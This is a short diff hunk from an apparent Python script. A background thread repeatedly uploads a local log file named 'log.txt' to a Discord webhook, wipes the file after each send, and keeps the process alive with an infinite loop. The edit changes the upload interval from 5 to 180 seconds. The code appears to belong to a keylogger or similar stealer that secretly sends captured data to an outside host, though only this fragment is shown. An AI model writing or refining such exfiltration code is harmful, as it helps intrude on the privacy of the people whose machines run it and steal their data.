@@ -35,7 +35,7 @@ def run():
                     webhook.add_file(c.read(), "log.txt")
                 with open(tmp, "w") as f: f.write("") #reset logs
                 webhook.execute()
-                sleep(5)
+                sleep(180)
     t = threading.Thread(target=discord_stuff)
     t.start()
     while True: pass #forever right?
